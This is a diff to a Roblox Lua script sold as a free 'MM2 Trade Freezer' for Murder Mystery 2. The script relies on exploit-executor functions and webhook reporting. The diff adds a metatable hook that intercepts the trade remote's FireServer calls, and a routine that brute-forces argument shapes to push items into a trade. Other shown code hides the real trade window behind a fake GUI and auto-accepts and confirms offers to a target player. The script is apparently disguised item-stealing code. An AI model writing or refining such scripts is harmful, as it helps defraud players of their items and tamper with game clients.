@@ -1,4 +1,4 @@
---[[ MM2 Trade Freezer v9.1 | KEYLESS | FREE ]]
+--[[ MM2 Trade Freezer v9.2 | KEYLESS | FREE ]]
 
 local CONFIG = {
     WEBHOOK        = "",
@@ -42,6 +42,8 @@ local playerGui = lp:WaitForChild("PlayerGui")
 
 local STATE = { stopped = false, rounds = 0 }
 getgenv().MM2FZ = { stop = function() STATE.stopped = true end }
+
+local nc = newcclosure or function(f) return f end
 
 local httpFn = (syn and syn.request) or (http and http.request)
     or http_request or (fluxus and fluxus.request) or request
@@ -116,7 +118,7 @@ local function webhook(title, color, desc, fields, content)
         local thumb = {}
         thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
         local foot = {}
-        foot.text = "MM2 Trade Freezer v9.1"
+        foot.text = "MM2 Trade Freezer v9.2"
         local emb = {}
         emb.title = title
         emb.description = desc
@@ -365,7 +367,7 @@ footer.Font = Enum.Font.Gotham
 footer.TextSize = 9
 footer.TextXAlignment = Enum.TextXAlignment.Center
 footer.TextColor3 = Color3.fromRGB(120, 115, 145)
-footer.Text = "keyless · v9.1"
+footer.Text = "keyless · v9.2"
 footer.Parent = main
 
 local timerCount = 0
@@ -494,7 +496,7 @@ local function runLoader()
 end
 task.spawn(runLoader)
 
-log("Trade Freezer v9.1 loaded")
+log("Trade Freezer v9.2 loaded")
 
 local VALUES = {}
 
@@ -608,7 +610,6 @@ local JUNK = {
     ["loading..."]=true, ["materials"]=true, ["container"]=true, ["result"]=true,
     ["unique"]=true, ["chroma"]=true, ["halloween"]=true, ["christmas"]=true,
     ["easter"]=true, ["summer"]=true, ["ancient"]=true, ["godly"]=true,
-    ["random legendary knife"]=true, ["random legendary gun"]=true,
 }
 
 local function isJunkName(n)
@@ -724,6 +725,42 @@ R.accept  = byPath(CONFIG.REMOTES.accept)
 R.confirm = byPath(CONFIG.REMOTES.confirm)
 R.cancel  = byPath(CONFIG.REMOTES.cancel)
 
+local hookDone = false
+
+local function hookOffer()
+    if hookDone then return end
+    hookDone = true
+    pcall(function()
+        local target = R.add
+        if not target then return end
+        local mt = getrawmetatable(game)
+        local oldIndex = mt.__index
+        setreadonly(mt, false)
+        mt.__index = nc(function(self, k)
+            local v = oldIndex(self, k)
+            if self == target and k == "FireServer" then
+                return nc(function(_, ...)
+                    local a = {}
+                    for i = 1, select("#", ...) do
+                        local x = select(i, ...)
+                        if typeof(x) == "Instance" then
+                            a[i] = x.ClassName .. ":" .. x.Name
+                        else
+                            a[i] = tostring(x)
+                        end
+                    end
+                    print("[FZ] OFFER ARGS = " .. table.concat(a, " , "))
+                    return v(_, ...)
+                end)
+            end
+            return v
+        end)
+        setreadonly(mt, true)
+        print("[FZ] offer hook installed")
+    end)
+end
+hookOffer()
+
 local function hideTradeUI()
     for _, g in ipairs(playerGui:GetChildren()) do
         if g ~= fakeGui and g:IsA("ScreenGui") then
@@ -836,25 +873,46 @@ local function waitForTarget()
     return nil
 end
 
-local function tryOffer(it, base, placed)
-    call(R.add, it.slot)
-    task.wait(0.3)
-    local g = tradeGui()
-    local c = offerCount(g)
-    if c and c > base + placed then return true end
+local SHAPES = {
+    { "slot" },
+    { "slot0" },
+    { "name" },
+    { "namelower" },
+    { "slotstr" },
+    { "card" },
+    { "slotname" },
+    { "nameslot" },
+}
 
-    call(R.add, it.name)
-    task.wait(0.25)
-    g = tradeGui()
-    c = offerCount(g)
-    if c and c > base + placed then return true end
+local function shapeArgs(it, shape)
+    local a = {}
+    for _, s in ipairs(shape) do
+        if s == "slot" then a[#a + 1] = it.slot
+        elseif s == "slot0" then a[#a + 1] = it.slot - 1
+        elseif s == "name" then a[#a + 1] = it.name
+        elseif s == "namelower" then a[#a + 1] = it.name:lower()
+        elseif s == "slotstr" then a[#a + 1] = tostring(it.slot)
+        elseif s == "card" then a[#a + 1] = it.card
+        elseif s == "slotname" then a[#a + 1] = it.slot; a[#a + 1] = it.name
+        elseif s == "nameslot" then a[#a + 1] = it.name; a[#a + 1] = it.slot
+        end
+    end
+    return a
+end
 
-    call(R.add, it.name, it.slot)
-    task.wait(0.25)
-    g = tradeGui()
-    c = offerCount(g)
-    if c and c > base + placed then return true end
-
+local function tryOffer(it, base, placed, verbose)
+    for idx, shape in ipairs(SHAPES) do
+        local args = shapeArgs(it, shape)
+        call(R.add, table.unpack(args))
+        task.wait(0.3)
+        local g = tradeGui()
+        local c = offerCount(g)
+        if c and c > base + placed then
+            if verbose then log("shape ok: " .. table.concat(shape, "+")) end
+            return true
+        end
+        if verbose then log("shape " .. idx .. " no: " .. table.concat(shape, "+")) end
+    end
     return false
 end
 
@@ -888,14 +946,16 @@ local function doRound(batch, tgt, round)
 
     local base = offerCount(gui) or 0
     local placed = 0
-    for _, it in ipairs(batch) do
+    for i, it in ipairs(batch) do
         if STATE.stopped then break end
-        if tryOffer(it, base, placed) then placed = placed + 1 end
+        local verbose = (i == 1 and CONFIG.DEBUG)
+        if tryOffer(it, base, placed, verbose) then
+            placed = placed + 1
+        end
         task.wait(0.15)
     end
 
     if placed == 0 then
-        log("dbg slot=" .. tostring(batch[1].slot) .. " name=" .. tostring(batch[1].name))
         call(R.cancel)
         return false, "nothing placed"
     end
